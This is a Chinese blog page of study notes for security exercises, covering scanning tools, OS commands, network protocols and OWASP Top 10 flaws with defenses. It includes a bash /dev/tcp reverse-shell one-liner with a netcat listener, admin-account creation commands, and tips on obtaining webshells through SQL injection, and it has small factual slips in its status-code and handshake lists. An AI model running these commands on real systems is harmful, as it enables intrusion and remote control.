@@ -1,0 +1,1165 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XSS跨站脚本 | RJ の 博客</title><meta name="author" content="Rui Ji"><meta name="copyright" content="Rui Ji"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="HVV笔记手工挖掘+工具扫描（挖掘思路）常见的web类型扫描器：awvs、appscan、xray、burp 步骤： 1、给一个目标，先检测是否存活。 2、爬虫阶段 3、漏洞扫描 常见的主机类型扫描器：nmap、nessus、极光、天镜 步骤： 1、给一个目标，先检测是否存活。 2、端口扫描找开启服务（nmap） 3、漏洞扫描 常见的端口扫描器：Nmap 漏洞验证方面的工具：sqlmap、msf、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS跨站脚本">
+<meta property="og:url" content="http://ruijiluo.github.io/2023/12/20/HVV%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="RJ の 博客">
+<meta property="og:description" content="HVV笔记手工挖掘+工具扫描（挖掘思路）常见的web类型扫描器：awvs、appscan、xray、burp 步骤： 1、给一个目标，先检测是否存活。 2、爬虫阶段 3、漏洞扫描 常见的主机类型扫描器：nmap、nessus、极光、天镜 步骤： 1、给一个目标，先检测是否存活。 2、端口扫描找开启服务（nmap） 3、漏洞扫描 常见的端口扫描器：Nmap 漏洞验证方面的工具：sqlmap、msf、">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg">
+<meta property="article:published_time" content="2023-12-20T12:57:43.000Z">
+<meta property="article:modified_time" content="2025-04-25T05:42:01.830Z">
+<meta property="article:author" content="Rui Ji">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg"><link rel="shortcut icon" href="https://s2.loli.net/2023/09/07/hRcHvbPo15QmB7T.png"><link rel="canonical" href="http://ruijiluo.github.io/2023/12/20/HVV%E7%AC%94%E8%AE%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XSS跨站脚本',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-04-25 13:42:01'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="./themes/butterfly/source/css/bg_color.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/09/07/oZOaspjYrzmT5e9.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="RJ の 博客"><span class="site-name">RJ の 博客</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XSS跨站脚本</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-20T12:57:43.000Z" title="发表于 2023-12-20 20:57:43">2023-12-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-25T05:42:01.830Z" title="更新于 2025-04-25 13:42:01">2025-04-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XSS跨站脚本"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="HVV笔记"><a href="#HVV笔记" class="headerlink" title="HVV笔记"></a>HVV笔记</h1><h4 id="手工挖掘-工具扫描（挖掘思路）"><a href="#手工挖掘-工具扫描（挖掘思路）" class="headerlink" title="手工挖掘+工具扫描（挖掘思路）"></a>手工挖掘+工具扫描（挖掘思路）</h4><h5 id="常见的web类型扫描器："><a href="#常见的web类型扫描器：" class="headerlink" title="常见的web类型扫描器："></a><strong>常见的web</strong>类型扫描器：</h5><p>awvs、appscan、xray、burp</p>
+<p>步骤：</p>
+<p>1、给一个目标，先检测是否存活。</p>
+<p>2、爬虫阶段</p>
+<p>3、漏洞扫描</p>
+<h5 id="常见的主机类型扫描器："><a href="#常见的主机类型扫描器：" class="headerlink" title="常见的主机类型扫描器："></a><strong>常见的主机类型扫描器</strong>：</h5><p>nmap、nessus、极光、天镜</p>
+<p>步骤：</p>
+<p>1、给一个目标，先检测是否存活。</p>
+<p>2、端口扫描找开启服务（nmap）</p>
+<p>3、漏洞扫描</p>
+<h5 id="常见的端口扫描器："><a href="#常见的端口扫描器：" class="headerlink" title="常见的端口扫描器："></a><strong>常见的端口扫描器</strong>：</h5><p>Nmap</p>
+<h5 id="漏洞验证方面的工具："><a href="#漏洞验证方面的工具：" class="headerlink" title="漏洞验证方面的工具："></a><strong>漏洞验证方面的工具</strong>：</h5><p>sqlmap、msf、beef</p>
+<h5 id="信息收集方面的工具："><a href="#信息收集方面的工具：" class="headerlink" title="信息收集方面的工具："></a><strong>信息收集方面的工具</strong>：</h5><p>御剑、fofa、whois、goby、shadon、钟馗之眼 ：网络空间搜索引擎</p>
+<h4 id="Linux、Windows"><a href="#Linux、Windows" class="headerlink" title="Linux、Windows"></a>Linux、Windows</h4><p>Linux和Windows操作系统知识，以及相关的命令和安全配置技能</p>
+<h5 id="1-操作系统常用命令"><a href="#1-操作系统常用命令" class="headerlink" title="1.   操作系统常用命令"></a>1.   操作系统常用命令</h5><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><p>ipconfig   	  	        查ip</p>
+<p>systeminfo   	 	    查看系统信息</p>
+<p>netstat -ano   		   网络连接状态</p>
+<p>tasklist      			 查看进程</p>
+<p>taskkill      			 杀死进程</p>
+<p>whoami     			查看当前用户</p>
+<p>net localgroup  		查看组</p>
+<p>net user    			 查看用户</p>
+<p>net user admin &#x2F;add        添加admin用户</p>
+<p>net user localgroup administrators 用户 &#x2F;add 	添加到管理组</p>
+<p><strong>打开注册表快捷方式，计划任务快捷方式：</strong></p>
+<p>regedit</p>
+<p>taskschd.msc</p>
+<h5 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h5><p>netstat -ltnp&#x2F;-anp     		    查看网络连接命令</p>
+<p>ifconfig或ip addr  			 查看ip地址</p>
+<p>whoami       				   查看当前用户</p>
+<p>su         					   切换账号  </p>
+<p>sudo       					 临时提示权限 </p>
+<p>ps top   					  查进程</p>
+<p>cd      					       切换目录  </p>
+<p>.&#x2F;  						    当前目录  </p>
+<p>..&#x2F; 						    上级目录 </p>
+<p>ls  						   列目录</p>
+<p>pwd					        列出当前路径</p>
+<p>mkdir    					 创建目录</p>
+<p>vi vim      				       创建、编辑文件</p>
+<p>mv     					     移动文件</p>
+<p>copy                                               复制</p>
+<p><strong>添加账号：</strong></p>
+<p>useradd 用户  </p>
+<p>passwd 用户  </p>
+<p><strong>权限查看：</strong></p>
+<p>ls -l  						读写执行 d-wx || rw- || r-x   dir  tree   </p>
+<p>​                                                         r  w   x</p>
+<p>ll</p>
+<p><strong>添加权限：</strong></p>
+<p>三组：	当前用户 当前用户组 其他用户</p>
+<p>chmod 777  1.txt   （777  r 4 w 2 x 1）</p>
+<p>chmod +x +w   2.txt</p>
+<p><strong>包管理器: yum、wget、apt、rpm</strong></p>
+<p>yum install ssh</p>
+<p>apt   install ssh</p>
+<p>wget <a target="_blank" rel="noopener" href="http://www.baidu.com/1.zip">http://www.baidu.com/1.zip</a></p>
+<p><strong>服务关闭、开启、状态</strong>：</p>
+<p>service          mysqld  start       centos7以前</p>
+<p>systemctl      start       mysqld  centos7</p>
+<p><strong>linux里面反弹shell：</strong></p>
+<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.52.3&#x2F;11111 0&gt;&amp;1</p>
+<p><strong>网络监听：</strong></p>
+<p>nc -lvvp 11111  </p>
+<h5 id="2-Linux操作系统："><a href="#2-Linux操作系统：" class="headerlink" title="2.Linux操作系统："></a>2.<strong>Linux操作系统：</strong></h5><ul>
+<li>理解Linux服务搭建和配置：如Web服务器（Apache、Nginx）、数据库服务器（MySQL、PostgreSQL）、文件服务器（Samba）、DNS服务器（Bind）、邮件服务器（Postfix、Sendmail）等。</li>
+</ul>
+<h5 id="3-Windows操作系统："><a href="#3-Windows操作系统：" class="headerlink" title="3.Windows操作系统："></a>3.<strong>Windows操作系统：</strong></h5><ul>
+<li>了解Windows服务搭建和配置：如IIS（Internet Information Services）、SQL Server、Active Directory等。</li>
+</ul>
+<h5 id="3-系统安全配置和基线加固："><a href="#3-系统安全配置和基线加固：" class="headerlink" title="3.系统安全配置和基线加固："></a>3.<strong>系统安全配置和基线加固：</strong></h5><ul>
+<li><p>掌握系统安全基础知识：如防火墙、身份认证、访问控制等。</p>
+</li>
+<li><p>熟悉系统安全加固方法：如关闭不必要的服务、禁用默认账户、设置强密码策略、安装更新补丁等。</p>
+</li>
+<li><p>了解安全审计和监控工具：如安全信息与事件管理系统（SIEM）、入侵检测系统（IDS&#x2F;IPS）、文件完整性检查工具(md5数据指纹)等。</p>
+</li>
+</ul>
+<h4 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h4><h5 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h5><p>应用层</p>
+<p>表示层</p>
+<p>会话层</p>
+<p>传输层</p>
+<p>网络层</p>
+<p>数据链路层</p>
+<p>物理层</p>
+<h5 id="TCP-IP"><a href="#TCP-IP" class="headerlink" title="TCP&#x2F;IP"></a>TCP&#x2F;IP</h5><ol>
+<li><strong>IP：</strong> IP协议是TCP&#x2F;IP协议族的核心协议之一，负责在网络中传输数据包。它定义了一种数据包的格式，以及如何将数据包从源地址传输到目标地址，实现了全球互联网中不同网络之间的通信。</li>
+<li><strong>TCP：</strong> TCP是一种面向连接的协议，用于在网络中可靠地传输数据。它负责将数据分割成小的数据段，并确保这些数据段按照顺序到达目标主机，同时处理丢失、重复和损坏的数据段(<strong>面向连接,拥塞控制,流量控制,可靠性</strong>)。</li>
+<li><strong>UDP：</strong> UDP是一种无连接的协议，用于在网络中快速传输数据，但不保证数据的可靠性和顺序。UDP通常用于实时应用程序，如音频和视频流(<strong>无连接,不可靠,无拥塞和流量控制</strong>)。</li>
+<li><strong>ICMP：</strong> ICMP是用于在IP网络中发送错误和控制消息的协议，用于诊断网络问题和通知网络中的主机有关重要事件的信息。</li>
+<li><strong>ARP：</strong> ARP用于将IP地址解析为MAC地址，以便在网络中进行数据包的传输。</li>
+</ol>
+<h5 id="三次握手和四次挥手："><a href="#三次握手和四次挥手：" class="headerlink" title="三次握手和四次挥手："></a>三次握手和四次挥手：</h5><p>三次握手的过程：</p>
+<ol>
+<li><strong>客户端发送SYN(确认序列号)：</strong> 请求建立连接。</li>
+<li><strong>服务器回复SYN和ACK(同步序列号)：</strong> 确认收到连接请求，并表示同意建立连接。</li>
+<li><strong>客户端发送ACK：</strong> 确认连接建立。</li>
+</ol>
+<p>四次挥手的过程：</p>
+<ol>
+<li><strong>客户端发送FIN(标志号)：</strong> 当客户端决定关闭连接时，它会发送一个带有FIN标志的TCP数据包给服务器，表示要关闭连接。</li>
+<li><strong>服务器回复ACK：</strong> 服务器收到客户端的FIN后，会回复一个带有ACK标志的TCP数据包给客户端，表示收到关闭请求。</li>
+<li><strong>服务器发送FIN：</strong> 服务器在准备关闭连接时，会发送一个带有FIN标志的TCP数据包给客户端，表示服务器也准备关闭连接。</li>
+<li><strong>客户端回复ACK：</strong> 客户端收到服务器的FIN后，会回复一个带有ACK标志的TCP数据包给服务器，表示确认关闭连接请求。</li>
+</ol>
+<h5 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h5><ol>
+<li><strong>1xx（信息）：</strong> 请求正在进行处理，需要进一步操作。<ul>
+<li><strong>100 Continue：</strong> 服务器已收到请求的起始部分，客户端应继续发送其余部分。</li>
+<li><strong>101 Switching Protocols：</strong> 服务器已经理解了客户端的请求，并将通过Upgrade消息头通知客户端切换协议。</li>
+</ul>
+</li>
+<li><strong>2xx（成功）：</strong> 请求已成功被服务器接收、理解、接受。<ul>
+<li><strong>200 OK：</strong> 请求成功。</li>
+<li><strong>201 Created：</strong> 请求已经被实现，并且创建了新的资源。</li>
+<li><strong>204 No Content：</strong> 服务器成功处理了请求，但未返回任何内容。</li>
+</ul>
+</li>
+<li><strong>3xx（重定向）：</strong> 需要进一步的操作以完成请求。<ul>
+<li><strong>301 Moved Permanently：</strong> 请求的资源已被永久移动到新的URL。</li>
+<li><strong>302 Found：</strong> 请求的资源临时移动到了新的URL。</li>
+<li><strong>304 Not Modified：</strong> 资源未修改，可使用缓存的版本。</li>
+</ul>
+</li>
+<li><strong>4xx（客户端错误）：</strong> 客户端发送的请求有错误，服务器无法处理。<ul>
+<li><strong>400 Bad Request：</strong> 请求无效，服务器不理解该请求。</li>
+<li><strong>401 Unauthorized：</strong> 需要用户认证。</li>
+<li><strong>403 Forbidden:</strong>    禁止访问。</li>
+<li><strong>404 Not Found：</strong> 服务器无法找到请求的资源。</li>
+</ul>
+</li>
+<li><strong>5xx（服务器错误）：</strong> 服务器在处理请求时发生了错误。<ul>
+<li><strong>500 Internal Server Error：</strong> 服务器内部错误。</li>
+<li><strong>503 Bad Gateway:</strong>  网关错误。</li>
+<li><strong>503 Service Unavailable：</strong> 服务器当前无法处理请求，一般用于临时维护或过载。</li>
+</ul>
+</li>
+</ol>
+<h5 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议:"></a>伪协议:</h5><ol>
+<li><strong>file:&#x2F;&#x2F;</strong>: 该伪协议用于访问本地文件系统中的文件。例如，”file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd”表示访问系统中的&#x2F;etc&#x2F;passwd文件。</li>
+<li><strong>php:filter</strong>: 这是 PHP 中的一种伪协议，用于对数据进行过滤处理。可以用于执行数据过滤、解码、编码等操作。</li>
+<li><strong>php:input</strong>: 这也是 PHP 中的一种伪协议，用于访问 HTTP 请求中的原始请求体数据。可以用于获取客户端提交的数据，如 POST 请求的数据。</li>
+<li><strong>zip:&#x2F;&#x2F;</strong>: 该伪协议用于访问 ZIP 归档文件中的内容。可以用于读取和操作 ZIP 文件中的文件。</li>
+<li><strong>phar:&#x2F;&#x2F;</strong>: 这是 PHP 中的一种伪协议，用于访问 PHAR（PHP Archive）归档文件中的内容。PHAR 是一种类似于 ZIP 的归档文件格式，用于打包 PHP 应用程序。</li>
+<li></li>
+</ol>
+<h4 id="OWASP-TOP10漏洞原理-2021"><a href="#OWASP-TOP10漏洞原理-2021" class="headerlink" title="OWASP TOP10漏洞原理 (2021)"></a><strong>OWASP TOP10漏洞原理 (2021)</strong></h4><h5 id="2021版本"><a href="#2021版本" class="headerlink" title="2021版本:"></a>2021版本:</h5><ol>
+<li>失效的访问控制</li>
+<li>加密机制失效</li>
+<li>注入</li>
+<li>不安全设计</li>
+<li>安全配置错误</li>
+<li>自带缺陷和过时的组件</li>
+<li>身份识别和身份验证错误</li>
+<li>软件和数据完整性故障</li>
+<li>安全日志和监控故障</li>
+<li>服务端请求伪造（ssrf）</li>
+</ol>
+<h5 id="2021举例"><a href="#2021举例" class="headerlink" title="2021举例:"></a>2021举例:</h5><ol>
+<li><strong>失效的访问控制：</strong>当应用程序未正确实施访问控制时，攻击者可能能够未经授权地访问敏感数据或执行敏感操作。<strong>例如</strong>，一个网站未正确限制用户对某些功能或页面的访问，导致普通用户可以访问管理员功能。</li>
+<li><strong>加密机制失效</strong>：如果应用程序使用的加密机制存在漏洞或实施不当，攻击者可能能够绕过加密，访问敏感数据。<strong>例如</strong>，如果应用程序使用弱加密算法或未正确实施密钥管理，攻击者可能能够轻松地解密加密数据。</li>
+<li><strong>注入：</strong>注入攻击是指攻击者向应用程序输入恶意代码或命令，以执行未经授权的操作或获取敏感信息。常见的注入攻击包括SQL注入和OS命令注入。<strong>例如</strong>，攻击者通过在登录表单中注入恶意SQL语句来绕过身份验证，获取管理员权限。</li>
+<li><strong>不安全设计：</strong>当应用程序的架构、设计或业务逻辑存在漏洞时，可能会导致安全风险。<strong>例如</strong>，一个电子商务网站设计不当，允许用户在未支付的情况下下载产品，从而导致收入损失。</li>
+<li><strong>安全配置错误：</strong>如果应用程序或相关组件的安全配置不正确，可能会导致系统容易受到攻击。<strong>例如</strong>，如果服务器配置不正确，开放了不必要的服务或端口，可能会成为攻击者的目标。</li>
+<li><strong>自带缺陷和过时的组件：</strong>应用程序使用的第三方组件或库存在漏洞或过时版本时，可能会给应用程序带来安全风险。<strong>例如</strong>，一个网站使用的JavaScript库存在已知漏洞，攻击者可以利用这些漏洞对网站进行攻击。</li>
+<li><strong>身份识别和身份验证错误：</strong>当应用程序未能正确验证用户的身份或实施强大的身份验证措施时，可能会导致身份伪造或未经授权的访问。<strong>例如</strong>，应用程序未正确验证用户的凭据，允许攻击者访问敏感信息。</li>
+<li><strong>软件和数据完整性故障：</strong>当应用程序的软件或数据完整性受到损害时，可能会导致数据泄露或篡改。<strong>例如</strong>，一个电子邮件服务商的数据库遭受SQL注入攻击，导致用户的电子邮件地址和密码被窃取。</li>
+<li><strong>安全日志和监控故障：</strong>当应用程序未能正确记录安全事件或监控系统未能及时检测到安全威胁时，可能会导致攻击未被及时发现和应对。<strong>例如</strong>，一个网络服务器未能记录登录失败的尝试，导致无法及时发现暴力破解攻击。</li>
+<li><strong>服务端请求伪造（SSRF）：</strong>服务端没有对用户提供的可控url进行有效的地址限制和足够的检测，导致用户可以利用服务器,访问恶意资源或作为跳板去攻击内网的或其他服务器。<strong>例如</strong>，假设有一个网站允许用户上传图片并将其显示在网页上。然而，该网站没有对用户上传的图片进行足够的验证和过滤。攻击者可以利用这一功能上传一个包含恶意代码的图片，并在上传时修改图片的URL，使其指向内部系统的某个地址，比如内部服务器的管理界面。当网站尝试加载这个图片时，它实际上会向内部系统发送一个HTTP请求，由于攻击者可以控制请求的内容，他们可以发送任意的请求，包括向内部系统的管理界面发送恶意命令或获取敏感信息。</li>
+</ol>
+<h5 id="2017版本"><a href="#2017版本" class="headerlink" title="2017版本:"></a>2017版本:</h5><h5 id="1-注入攻击："><a href="#1-注入攻击：" class="headerlink" title="1. 注入攻击："></a>1. 注入攻击：</h5><ul>
+<li><p><strong>原理：</strong> 注入攻击利用应用程序未正确过滤用户输入数据的漏洞，将恶意代码注入到应用程序的命令中，以执行未经授权的操作</p>
+</li>
+<li><p><strong>示例：</strong> SQL 注入、命令注入、LDAP 注入等</p>
+</li>
+<li><p>**种类： **字符、布尔、报错、时间延迟、联合、堆叠、宽字节、XFF等</p>
+</li>
+<li><p><strong>防御:</strong>    使用预编译，PHP 中用于访问数据库访问接口(PDO)，正则表达式过滤，开启魔术引号，加装waf</p>
+</li>
+<li><p><strong>预编译原理：</strong>预编译将一次查询通过两次的交互完成，第一次交互发送查询语句的模板，由后端的sql引擎解析为AST或Opcode中执行，无论后续向模板传入什么参数，这些参数仅仅被当成字符串进行查询处理，因此杜绝了sql注入的产生。</p>
+</li>
+<li><p>预编译的核心就是把sql语句参数化，可参数化的位置一般仅有where处,而除了where处的order by、group by、limit、join等字段处不可参数化，此处的查询语句存在拼接的可能。</p>
+</li>
+<li><p>sql注入常用的报错函数:</p>
+<ul>
+<li>updatexml()</li>
+<li>extractvalue()</li>
+<li>floor()</li>
+</ul>
+</li>
+<li><p>盲注：</p>
+<ul>
+<li><p><strong>sleep被过滤了</strong>：</p>
+<p>使用等价函数绕过benchmark(次数，表达式)</p>
+</li>
+</ul>
+</li>
+<li><p><strong>sql注入危害</strong></p>
+<p>从数据库读取内容、拿webshell</p>
+<p>os-shell  –file-write  写文件  –file-read 读文件</p>
+<p>into outfile  into dumpfile</p>
+<p>条件：1、root权限 2、绝对路径 3、gpc关闭off</p>
+<p>into outfile  into dumpfile(写文件)  load_file（读文件）</p>
+<h5 id="sql注入点怎么拿到webshell，利用条件有哪些"><a href="#sql注入点怎么拿到webshell，利用条件有哪些" class="headerlink" title="sql注入点怎么拿到webshell，利用条件有哪些"></a>sql注入点怎么拿到webshell，利用条件有哪些</h5><p>手工导出函数：into outfile   into dumpfile</p>
+<p>Sqlmap参数：os-shell      –file-write</p>
+<p>比如有phpmyadmin 拿到数据库账号密码。 通过日志拿webshell</p>
+<p><strong>利用条件：</strong></p>
+<p>有可写目录、知道绝对路径、有file权限、有root权限</p>
+</li>
+</ul>
+<h5 id="2-跨站脚本（XSS）攻击："><a href="#2-跨站脚本（XSS）攻击：" class="headerlink" title="2. 跨站脚本（XSS）攻击："></a>2. 跨站脚本（XSS）攻击：</h5><ul>
+<li><p><strong>原理：</strong> 跨站脚本攻击利用应用程序未正确转义和过滤用户输入数据的漏洞，在用户的浏览器中执行恶意脚本，以窃取用户信息或执行未经授权的操作。</p>
+</li>
+<li><p><strong>示例：</strong> 存储型 XSS、反射型 XSS、DOM 型 XSS 等。</p>
+</li>
+<li><p><strong>区别：</strong></p>
+<ul>
+<li>存储型常出现在信息修改添加等地方，导致恶意代码存储在数据库中，用户访问就会触发执行。</li>
+<li>反射型常出现在url中，一般需要攻击者提前构造号恶意链接，欺骗用户点击，触发攻击代码。</li>
+<li>DOM型常出现在url中，然后输出在了浏览器的DOM节点中。DOM型相较前两者，不需要经过后端的渲染。</li>
+</ul>
+</li>
+<li><p><strong>防御:</strong>    对输入数据进行<strong>HTML encode处理</strong>，<strong>将特殊字符转化为字符实体</strong>，<strong>白名单过滤</strong>，<strong>过滤js事件标签</strong>，<strong>开启http-only</strong>(使得 Cookie 只能通过 HTTP 或 HTTPS 协议访问，而不能通过 JavaScript中的document.cookie访问)，装<strong>waf</strong>等。</p>
+</li>
+</ul>
+<h5 id="3-敏感数据暴露："><a href="#3-敏感数据暴露：" class="headerlink" title="3. 敏感数据暴露："></a>3. 敏感数据暴露：</h5><ul>
+<li><p><strong>原理：</strong> 应用程序未正确保护敏感数据，导致攻击者能够获取或窃取用户的敏感信息，如密码、信用卡号等。</p>
+</li>
+<li><p><strong>示例：</strong> 未加密的数据存储、不安全的传输、缺乏访问控制等。</p>
+</li>
+<li><p><strong>防御:</strong>    加密敏感数据使数据脱敏,不使用弱口令,使用 HTTPS 协议,最小化数据收集和存储,尽快删除不再需要的数据,强化访问控制</p>
+</li>
+</ul>
+<h5 id="4-XML-外部实体攻击-xxe-："><a href="#4-XML-外部实体攻击-xxe-：" class="headerlink" title="4. XML 外部实体攻击(xxe)："></a>4. XML 外部实体攻击(xxe)：</h5><ul>
+<li><p><strong>原理：</strong> XML 外部实体攻击利用应用程序未正确处理 XML 输入的漏洞，导致攻击者能够读取任意文件、执行远程代码等。</p>
+</li>
+<li><p><strong>示例：</strong> 实体扩展攻击、参数实体攻击、外部 DTD 引用攻击等。</p>
+</li>
+<li><p><strong>防御:</strong>    禁用外部实体解析（使用python中的lxml的xml解析器）, 使用白名单,移除或过滤不必要的 DTD,配置安全的解析器(不会对外部实体进行默认处理,或者能够方便地禁用外部实体)</p>
+</li>
+</ul>
+<h5 id="5-缺失的身份认证："><a href="#5-缺失的身份认证：" class="headerlink" title="5. 缺失的身份认证："></a>5. 缺失的身份认证：</h5><ul>
+<li><p><strong>原理：</strong> 缺失的身份认证指应用程序未正确实施身份验证和会话管理，导致攻击者能够绕过认证机制获得未授权的访问权限。</p>
+</li>
+<li><p><strong>示例：</strong> 默认凭证、弱密码、会话固定、会话劫持等。</p>
+</li>
+<li><p><strong>防御:</strong>    </p>
+<p>1.强制身份认证：</p>
+<ul>
+<li>例如使用用户名和密码、多因素身份验证、单点登录（SSO）等。</li>
